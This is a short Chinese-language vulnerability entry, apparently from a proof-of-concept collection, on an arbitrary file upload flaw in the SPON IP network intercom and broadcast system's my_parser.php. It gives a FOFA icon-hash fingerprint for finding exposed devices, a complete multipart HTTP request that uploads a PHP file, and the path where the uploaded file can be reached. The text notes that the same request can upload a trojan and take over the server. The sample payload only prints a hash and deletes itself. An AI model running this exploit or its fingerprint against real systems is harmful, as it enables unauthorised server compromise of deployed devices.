## 世邦通信SPON-IP网络对讲广播系统my_parser.php任意文件上传漏洞

世邦通信 SPON IP网络对讲广播系统 my_parser.php 存在任意文件上传漏洞，攻击者可以通过漏洞上传任意文件甚至木马文件，从而获取服务器权限。

## fofa

```
icon_hash="-1830859634"
```

## poc

```
POST /upload/my_parser.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Content-Length: 279
Content-Type: multipart/form-data; boundary=0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
Accept-Encoding: gzip, deflate, br
Connection: close

--0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
Content-Disposition: form-data; name="upload"; filename="test.php"
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
--0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230--
```

![image-20240618124826420](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406181248478.png)

访问路径：`http://127.0.0.1/upload/files/test.php`